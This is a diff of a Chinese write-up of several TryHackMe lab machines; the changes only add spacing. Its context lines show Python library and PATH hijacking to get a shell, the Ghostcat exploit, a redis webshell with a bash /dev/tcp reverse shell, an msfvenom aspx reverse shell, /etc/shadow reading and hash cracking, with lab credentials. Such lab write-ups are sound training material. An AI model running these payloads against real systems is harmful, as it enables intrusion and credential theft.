@@ -1,8 +1,8 @@
 
 
-# TryHackMe一些打靶记录 - 先知社区
+# TryHackMe 一些打靶记录 - 先知社区
 
-TryHackMe一些打靶记录
+TryHackMe 一些打靶记录
 
 - - -
 
@@ -14,13 +14,13 @@ nmap+masscan
 
 [![](assets/1706771526-adf1d4c346cf85fcd1ab649995cb2043.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222657-74ee44ce-beb2-1.png)
 
-之后gobuster扫描一下目录
+之后 gobuster 扫描一下目录
 
 [![](assets/1706771526-19f1138f5ef096997e4c72a569c33550.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222702-7835d868-beb2-1.png)
 
 [![](assets/1706771526-dc6cdbd68ee8c0fa8a69f37b2bdab2cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222707-7b1e5488-beb2-1.png)
 
-继续gobuster扫描
+继续 gobuster 扫描
 
 [![](assets/1706771526-8f7f2685983e8b8162e0c66b251963f6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222712-7e16c45e-beb2-1.png)
 
@@ -32,7 +32,7 @@ http://10.10.194.98/r/a/b/b/i/t/
 
 [![](assets/1706771526-0ea0db476228a09a7417e1d64149c80e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222717-811323b4-beb2-1.png)
 
-查看源码得到ssh连接的账号密码
+查看源码得到 ssh 连接的账号密码
 
 [![](assets/1706771526-8b01551f6976b6e7569b2062ec118167.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222721-83916614-beb2-1.png)
 
@@ -40,13 +40,13 @@ http://10.10.194.98/r/a/b/b/i/t/
 alice:HowDothTheLittleCrocodileImproveHisShiningTail
 ```
 
-之后SSH连接
+之后 SSH 连接
 
 ## 漏洞分析
 
-### 根据导入第三方python库引发的提权
+### 根据导入第三方 python 库引发的提权
 
-sudo提权
+sudo 提权
 
 [![](assets/1706771526-b05373856df936593850f42e00804a39.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222728-87804916-beb2-1.png)
 
@@ -183,7 +183,7 @@ for i in range(10):
     print("The line was:\t", line)
 ```
 
-看起来就是利用random库实现一个随机打印10行诗歌，我们定位一个random库的位置，先看一下python3模块的目录
+看起来就是利用 random 库实现一个随机打印 10 行诗歌，我们定位一个 random 库的位置，先看一下 python3 模块的目录
 
 ```plain
 python3 -c 'import sys; print (sys.path)'
@@ -193,7 +193,7 @@ python3 -c 'import sys; print (sys.path)'
 
 发现这里有一个空白的的模块未被使用
 
-这里我创建了一个起/bin/sh的脚本
+这里我创建了一个起/bin/sh 的脚本
 
 ```plain
 import os
@@ -203,7 +203,7 @@ os.system('/bin/sh')
 
 [![](assets/1706771526-f8c2be0a98782916164ff2589b098927.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222744-9159518a-beb2-1.png)
 
-这样和walrus脚本在同一目录，这样的话，他和random.py是调用模块是一样的，我们如果执行了walrus脚本，也可以执行random.py
+这样和 walrus 脚本在同一目录，这样的话，他和 random.py 是调用模块是一样的，我们如果执行了 walrus 脚本，也可以执行 random.py
 
 ```plain
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
@@ -213,7 +213,7 @@ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 
 ### 调用二进制文件相对路径的坏处
 
-进入rabbit目录，发现有一个64位的二进制文件，直接执行发现没有提权，IDA分析一下，发现main函数存在逻辑问题
+进入 rabbit 目录，发现有一个 64 位的二进制文件，直接执行发现没有提权，IDA 分析一下，发现 main 函数存在逻辑问题
 
 [![](assets/1706771526-cca06f65ddab20863f60d8f302aca4f1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222754-97524dbc-beb2-1.png)
 
@@ -223,19 +223,19 @@ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 
 [![](assets/1706771526-0da92ce1fc97db09a2e6b24ff43214fa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222911-c4d74134-beb2-1.png)
 
-可以看到这里调用了date,但是没有绝对路径，所以我们可以创建一个date文件，之后再环境变量中添加这个路径即可
+可以看到这里调用了 date，但是没有绝对路径，所以我们可以创建一个 date 文件，之后再环境变量中添加这个路径即可
 
 先看一下环境变量
 
 [![](assets/1706771526-254424e275f2a4dbbf87912fe52aed47.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222914-c724e32e-beb2-1.png)
 
-tmp目录是所有用户可读写的，可以将date文件创建在tmp下，然后将tmp添加到环境变量中
+tmp 目录是所有用户可读写的，可以将 date 文件创建在 tmp 下，然后将 tmp 添加到环境变量中
 
 ```plain
 export PATH=/tmp:$PATH
 ```
 
-之后创建一个date的文件
+之后创建一个 date 的文件
 
 ```plain
 #!/bin/sh
@@ -248,21 +248,21 @@ chmod +x date
 
 [![](assets/1706771526-1bf578f841710fb04e7f7fc40566c99d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222920-ca3382a0-beb2-1.png)
 
-得到password
+得到 password
 
 ```plain
 WhyIsARavenLikeAWritingDesk?
 ```
 
-su换一下用户
+su 换一下用户
 
-## 定时任务提权root
+## 定时任务提权 root
 
-尝试sudo和suid提权发现没啥有用的，看一下定时任务
+尝试 sudo 和 suid 提权发现没啥有用的，看一下定时任务
 
 [![](assets/1706771526-02ad4677a6eabcd0953776bafea3b05f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222923-cc6afd46-beb2-1.png)
 
-发现perl有set\_uid
+发现 perl 有 set\_uid
 
 [![](assets/1706771526-f4f128cce12c107d878b08837eb67a3f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129222927-ceb48770-beb2-1.png)
 
@@ -286,9 +286,9 @@ nmap
 
 ## 漏洞分析
 
-这里知道了Apache Tomcat的信息，从exploit找一下对应poc
+这里知道了 Apache Tomcat 的信息，从 exploit 找一下对应 poc
 
-找到[https://www.exploit-db.com/exploits/48143](https://www.exploit-db.com/exploits/48143) ，发现CVE-2020-1938适用于Apache Tomcat 9.0.30
+找到[https://www.exploit-db.com/exploits/48143](https://www.exploit-db.com/exploits/48143) ，发现 CVE-2020-1938 适用于 Apache Tomcat 9.0.30
 
 ```plain
 #!/usr/bin/python3
@@ -685,21 +685,21 @@ python ajpShooter.py http://10.10.218.249 8009  /WEB-INF/web.xml read
 
 [![](assets/1706771526-9483023fa501a7fb5fa63904f2cead9a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223033-f5da7724-beb2-1.png)
 
-得到ssh连接的账号密码
+得到 ssh 连接的账号密码
 
 ```plain
 skyfuck:8730281lkjlkjdqlksalks
 ```
 
-finalshell连一下getshell
+finalshell 连一下 getshell
 
-### 考察gpg解密
+### 考察 gpg 解密
 
-ls看一下~目录有什么内容
+ls 看一下~目录有什么内容
 
 [![](assets/1706771526-40a5cc7f2e7f728aff1a8d0808290301.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223038-f90c1754-beb2-1.png)
 
-发现有一个asc文件，还有一个pgp文件，我们可以考虑asc文件就是credential文件经过gpg加密后的数据，可以爆破一波
+发现有一个 asc 文件，还有一个 pgp 文件，我们可以考虑 asc 文件就是 credential 文件经过 gpg 加密后的数据，可以爆破一波
 
 ```plain
 gpg2john tryhackme.asc > thm.txt
@@ -708,13 +708,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt thm.txt
 
 [![](assets/1706771526-85a4f4057e498ead59386679afb7e5ca.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223044-fcce3908-beb2-1.png)
 
-得到passwd，现在我们导入密钥文件
+得到 passwd，现在我们导入密钥文件
 
 ```plain
 tryhackme/alexandru
 ```
 
-我们还有一个pgp文件，需要导入一下刚刚的密钥
+我们还有一个 pgp 文件，需要导入一下刚刚的密钥
 
 ```plain
 pgp --import tryhackme.asc
@@ -728,9 +728,9 @@ gpg --decrypt crendential.pgp
 merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
 ```
 
-之后登录一下merlin用户
+之后登录一下 merlin 用户
 
-sudo提取zip，成功提权
+sudo 提取 zip，成功提权
 
 [![](assets/1706771526-16e2e3ef741d746ec0067bce1cca44af.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223052-0129b5c2-beb3-1.png)
 
@@ -750,7 +750,7 @@ masscan -p 0-65535 --rate=100000 10.10.3.51
 
 ## What version of Apache is running?
 
-nmap扫一下
+nmap 扫一下
 
 ```plain
 nmap -sV -p 80,22 -O -T4 10.10.92.61
@@ -766,7 +766,7 @@ nmap -sV -p 80,22 -O -T4 10.10.92.61
 gobuster dir -e -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,zip,html -u 10.10.92.61
 ```
 
-万能php反弹shell
+万能 php 反弹 shell
 
 ```plain
 <?php
@@ -960,7 +960,7 @@ function printit ($string) {
 ?>
 ```
 
-后缀检测fuzz
+后缀检测 fuzz
 
 ```plain
 php
@@ -985,25 +985,25 @@ ctp
 module
 ```
 
-利用万能php反弹shell getshell
+利用万能 php 反弹 shell getshell
 
 ## res
 
-信息搜集，masscan发现80,6379两个端口
+信息搜集，masscan 发现 80,6379 两个端口
 
-nmap详细扫描，发现一个redis数据库
+nmap 详细扫描，发现一个 redis 数据库
 
 [![](assets/1706771526-b760c657333fde5c1bf6288c33f7b2c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223216-33a00a24-beb3-1.png)
 
-## redis服务rce
+## redis 服务 rce
 
-可以利用redis-tools中的redis-cli进行连接redis
+可以利用 redis-tools 中的 redis-cli 进行连接 redis
 
 ```plain
 redis-cli -h 10.10.185.22 -p 6379
 ```
 
-利用redis服务的命令进行rce
+利用 redis 服务的命令进行 rce
 
 ```plain
 config set dir /var/www/html
@@ -1014,19 +1014,19 @@ save
 
 [![](assets/1706771526-9802d69df8f0ea9fbaeb5c7bdfe3265b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223227-399eef12-beb3-1.png)
 
-之后访问redis.php发现有phpinfo的界面
+之后访问 redis.php 发现有 phpinfo 的界面
 
-之后可以重新写个shell进行,
+之后可以重新写个 shell 进行，
 
-这里我正常写bash的shell不太行，调用了绝对路径才能弹shell
+这里我正常写 bash 的 shell 不太行，调用了绝对路径才能弹 shell
 
 ```plain
 set test “<?php exec(\”/bin/bash -c ‘bash -i > /dev/tcp/10.10.224.19/2333 0>&1’\”); ?>”
 ```
 
-之后进入shell，起一个标准的pythonshell
+之后进入 shell，起一个标准的 pythonshell
 
-suid提权xxd
+suid 提权 xxd
 
 先看一下/etc/shadow
 
@@ -1034,7 +1034,7 @@ suid提权xxd
 xxd "/etc/shadow" | xxd -r
 ```
 
-得到vianka的哈希，进行john爆破
+得到 vianka 的哈希，进行 john 爆破
 
 [![](assets/1706771526-22ad0a4b1c8b70c2abc352a2f0f103bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223231-3c3a077a-beb3-1.png)
 
@@ -1044,7 +1044,7 @@ xxd "/etc/shadow" | xxd -r
 
 ## 信息收集
 
-最好还是nmap收集，masscan有点问题(虽然收集的比较快)
+最好还是 nmap 收集，masscan 有点问题 (虽然收集的比较快)
 
 ```plain
 masscan -p 0-65535 --rate=100000 10.10.199.4
@@ -1064,15 +1064,15 @@ nmap -p 80,135,139,445,3389,49663,49667,49779 -sV -O -T4 10.10.199.4
 
 [![](assets/1706771526-bcde5d12b427a9008293e689c1382fc8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223315-56698d6e-beb3-1.png)
 
-挨个看一下，发现只有**80**和**49663**端口能访问服务，gobuster扫描一下目录
+挨个看一下，发现只有**80**和**49663**端口能访问服务，gobuster 扫描一下目录
 
-80扫不出东西，49663扫出来一个SMB的共享目录
+80 扫不出东西，49663 扫出来一个 SMB 的共享目录
 
 [![](assets/1706771526-ffd0926af344ddb7e3c4879bbc686f01.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223318-584a8c6e-beb3-1.png)
 
 ## 漏洞利用
 
-之后利用smbclient枚举SMB共享目录
+之后利用 smbclient 枚举 SMB 共享目录
 
 ```plain
 smbclient -L \\10.10.199.4
@@ -1080,7 +1080,7 @@ smbclient -L \\10.10.199.4
 
 [![](assets/1706771526-9a9fbaac6ac9455a48af483d0148dc29.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223323-5b40e0e4-beb3-1.png)
 
-发现确实和我们猜测的一样，有SMB共享目录，登录一下
+发现确实和我们猜测的一样，有 SMB 共享目录，登录一下
 
 ```plain
 smbclient //10.10.117.216/nt4wrksv
@@ -1088,13 +1088,13 @@ smbclient //10.10.117.216/nt4wrksv
 
 [![](assets/1706771526-f450ac80310e555120affcb9de7c6bb4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223327-5ddb451a-beb3-1.png)
 
-get一下password.txt
+get 一下 password.txt
 
 [![](assets/1706771526-e10395637de22569c913c7622216af19.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223332-607d44ee-beb3-1.png)
 
 [![](assets/1706771526-6022a6f5fa6ec1b502d0a941dd3acd68.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223335-62ae91be-beb3-1.png)
 
-base解密一下
+base 解密一下
 
 ```plain
 Bob - !P@$$W0rD!123
@@ -1104,17 +1104,17 @@ Bob - !P@$$W0rD!123
 Bill - Juw4nnaM4n420696969!$$$
 ```
 
-ssh远程连接一下，这里傻逼了，忘了没开20端口，应该不能这么打，这是windows的渗透。。。。
+ssh 远程连接一下，这里傻逼了，忘了没开 20 端口，应该不能这么打，这是 windows 的渗透。。。。
 
-应该从刚刚的SMB共享入手，SMB和linux下的ftp差不多，ftp怎么打SMB其实也差不多
+应该从刚刚的 SMB 共享入手，SMB 和 linux 下的 ftp 差不多，ftp 怎么打 SMB 其实也差不多
 
-利用**msfvenom**生成一个弹windows的shell
+利用**msfvenom**生成一个弹 windows 的 shell
 
 ```plain
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.37.127 LPORT=3333 -f aspx -o shell1.aspx
 ```
 
-之后将我们生成的shell.aspx put到SMB共享目录
+之后将我们生成的 shell.aspx put 到 SMB 共享目录
 
 之后我们访问一下
 
@@ -1124,7 +1124,7 @@ http://10.10.220.5:49663/nt4wrksv/shell1.aspx
 
 [![](assets/1706771526-edb1b2d2b53bcac3797ccf2c33989289.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223341-660c3b54-beb3-1.png)
 
-成功谈到windows的shell，windows的命令和linux还是不一样的
+成功谈到 windows 的 shell，windows 的命令和 linux 还是不一样的
 
 ```plain
 cd /
@@ -1136,7 +1136,7 @@ dir
 more user.txt
 ```
 
-得到user.txt
+得到 user.txt
 
 [![](assets/1706771526-7bd4d3ed162f4ddfd7ef42258ec09521.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223346-68ebd226-beb3-1.png)
 
@@ -1144,11 +1144,11 @@ more user.txt
 
 ## 权限提升
 
-在已获得的shell界面输入`whoami /priv`命令 查看当前用户在目标系统中的相关权限。
+在已获得的 shell 界面输入`whoami /priv`命令 查看当前用户在目标系统中的相关权限。
 
 [![](assets/1706771526-2a7ecb5f93b02b76daecbe36441f14c1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223350-6b223e18-beb3-1.png)
 
-由上图可知 当前用户似乎启用了 SeImpersonatePrivilege 令牌权限，这意味着我们可以使用令牌模拟来提升权限；接下来我们需要在目标机上执行一个漏洞利用程序--下载[PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)，并将该exe文件上传到目标机（可以通过SMB服务上传文件）。
+由上图可知 当前用户似乎启用了 SeImpersonatePrivilege 令牌权限，这意味着我们可以使用令牌模拟来提升权限；接下来我们需要在目标机上执行一个漏洞利用程序--下载[PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)，并将该 exe 文件上传到目标机（可以通过 SMB 服务上传文件）。
 
 [![](assets/1706771526-8ca8dcd796c79a79dd111c6c5a515f19.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240129223355-6e1cde34-beb3-1.png)
 
@@ -1156,7 +1156,7 @@ more user.txt
 dir /s /b c:\ | find "PrintSpoofer64.exe"
 ```
 
-全局搜索一下刚刚上传的这个exe的位置
+全局搜索一下刚刚上传的这个 exe 的位置
 
 ```plain
 cd c:\inetpub\wwwroot\nt4wrksv\
